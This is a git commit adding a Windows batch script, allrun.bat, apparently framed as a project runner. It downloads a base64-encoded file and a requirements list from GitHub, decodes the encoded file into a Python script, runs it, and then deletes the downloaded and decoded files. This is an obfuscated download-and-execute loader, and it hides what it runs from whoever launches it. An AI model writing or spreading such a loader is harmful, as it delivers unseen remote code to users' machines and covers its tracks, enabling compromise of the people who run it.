6e85cb8e0017e8e64c7a783c882ccc4c4112adf5
zerot2Dev <zerot2dev@gmail.com>
2024-05-11 10:30:58 +0700

    Add files via upload

---
+++ allrun.bat
@@ -0,0 +1,46 @@
+
+set "downloads_folder=%USERPROFILE%\Downloads"
+
+
+set "activate_script=%downloads_folder%.\.venv\Scripts\activate"
+
+call "%activate_script%"
+
+
+curl -O https://raw.githubusercontent.com/zerot2Dev/devsc/main/kilss.txt
+
+curl -O https://raw.githubusercontent.com/zerot2Dev/zero_import/main/requirements.txt
+
+
+pip install -r requirements.txt
+
+del requirements.txt
+set output_file=decoded_file.py
+
+
+echo import os  >> %output_file%
+echo import base64 >> %output_file%
+echo input_file_path = os.path.join(os.getcwd(), "kilss.txt") >> %output_file%
+echo with open(input_file_path, "r", encoding="utf-8") as file: >> %output_file%
+echo     encoded_data = file.read() >> %output_file%
+echo decoded_data = base64.b64decode(encoded_data) >> %output_file%
+echo output_file_path = os.path.join(os.getcwd(), "output.py") >> %output_file%
+
+echo with open(output_file_path, "w", encoding="utf-8") as output_file: >> %output_file%
+echo     output_file.write(decoded_data.decode("utf-8")) >> %output_file%
+
+
+if exist %output_file% (
+    python %output_file%
+    del %output_file%
+)
+
+
+if exist output.py (
+    python output.py
+    del output.py
+    del kilss.txt
+
+)
+
+pause
